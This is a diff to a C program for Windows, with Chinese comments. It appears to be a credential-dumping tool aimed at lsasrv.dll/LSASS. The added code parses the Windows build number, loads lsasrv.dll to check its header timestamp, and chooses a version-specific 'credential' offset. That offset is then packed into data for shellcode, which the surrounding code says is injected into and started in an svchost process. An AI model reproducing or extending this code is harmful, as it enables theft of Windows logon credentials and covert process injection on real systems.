@@ -182,6 +182,81 @@ int main(int argc, char** argv)
 		}
 	}
 	printf("[*] version: %s\n", res);
+
+
+	// 获取版本号，通过版本号来控制credential的偏移量
+	char* asdasdasdasd = (char*)malloc(123);
+	ZeroMemory(asdasdasdasd, 123);
+
+	char* readlyversionnumber = (char*)malloc(123);
+	ZeroMemory(readlyversionnumber, 123);
+	int counterrerer = 0;
+	memcpy_s(asdasdasdasd, 123, res, strlen(res));
+	for (int i = 0; i < strlen(asdasdasdasd); i++) {
+		if (asdasdasdasd[i] == '.') {
+			counterrerer++;
+			// 从这里往后面遍历
+			if (counterrerer == 2) {
+				int asdasdcounasdasdasdasd = 0;
+				for (int j = i + 1;; j++) {
+					asdasdcounasdasdasdasd++;
+					if (asdasdasdasd[j] == '.') {
+						break;
+					}
+				}
+				memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd - 1);
+			}
+		}
+	}
+	printf("build version: %s\n", readlyversionnumber);
+	int maxpowenum = strlen(readlyversionnumber) - 1;
+	int finalnumber = 0;
+	int oi = 0;
+	for (int i = 0; i < maxpowenum; i++) {
+		int temp = (readlyversionnumber[oi++] - '0') * pow(10, maxpowenum - i);
+		finalnumber += temp;
+	}
+	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
+	int _build_version = finalnumber;
+
+
+	int offset____ = 0;
+	if (_build_version < 3000) {
+		offset____ = 0x70;
+	}
+	else if (_build_version < 5000) {
+		offset____ = 0x70;
+	}
+	else if (_build_version < 7000) {
+		offset____ = 0xd8;
+	}
+	else if (_build_version < 8000) {
+		offset____ = 0xd8;
+	}
+	else if (_build_version < 9400) {
+		offset____ = 0xf8;
+	}
+	else {
+		offset____ = 0x108;
+	}
+	// 我们把lsasrv.dll自己加载上来看一下ntheader就行了
+ unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
+	if (lsasrvLocal == (unsigned char*)0) {
+		printf("[x] load module failed, abort...\n");
+		return 1;
+	}
+	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)lsasrvLocal;
+	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+		return 1;
+	}
+	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)lsasrvLocal + idh->e_lfanew);
+
+
+	// 还有一种例外情况
+	if (_build_version > 7000 && _build_version < 9400 && nt_headers->FileHeader.TimeDateStamp>0x53480000) {
+		offset____ = 0xe8;
+	}
+
 	DWORD offset = 0;
 	for (int i = 0; i < TABLE_LENGTH; i++) {
 		if (strcmp(res, version_table[i]) == 0) {
@@ -201,7 +276,11 @@ int main(int argc, char** argv)
 			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[i][0]);
 			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
 			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
-			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
+			// credential offset
+		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
+			// 这个偏移需要进行很多的判断，不能直接硬编码
+		sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", offset____);
+		// 
 			// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
 			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[i][4]);
 
@@ -228,6 +307,12 @@ int main(int argc, char** argv)
 		exit(-1);
 	}
 	free(res);
+
+
+
+
+
+
 	// 将shellcode写入目标进程内存并启动shellcode
 
 	// 获取第一个svchost进程的pid
